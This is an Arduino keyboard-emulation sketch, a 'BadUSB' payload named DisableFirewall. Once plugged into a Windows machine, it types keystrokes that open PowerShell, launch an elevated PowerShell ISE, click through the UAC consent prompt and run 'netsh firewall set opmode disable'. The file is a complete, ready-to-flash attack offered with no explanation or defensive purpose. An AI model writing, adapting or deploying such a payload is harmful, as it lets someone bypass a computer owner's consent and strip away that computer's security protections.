//DisableFirewall
#include <Keyboard.h>
char enter= KEY_RETURN;
char alt= KEY_LEFT_ALT;
char ctrl= KEY_LEFT_CTRL;
char izquierda = KEY_LEFT_ARROW;
char Win = KEY_LEFT_GUI;

void setup() {
  boot();
}
void loop() {
              }

void boot(){
  Keyboard.begin();
  delay(5000);
  Keyboard.press(Win);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.print("powershell");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay (8000);
  Keyboard.print("Start-Process powershell_ise -Verb runAs");
  Keyboard.press(enter);
  ///Keyboard.press('s');
  Keyboard.release(enter);
  delay(2000);
  Keyboard.press(izquierda);
  Keyboard.release(izquierda);
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(2000);
  Keyboard.print("netsh firewall set opmode disable");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay (100);
  Keyboard.print("exit");
  delay(100);
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay (100);
  Keyboard.end();
}
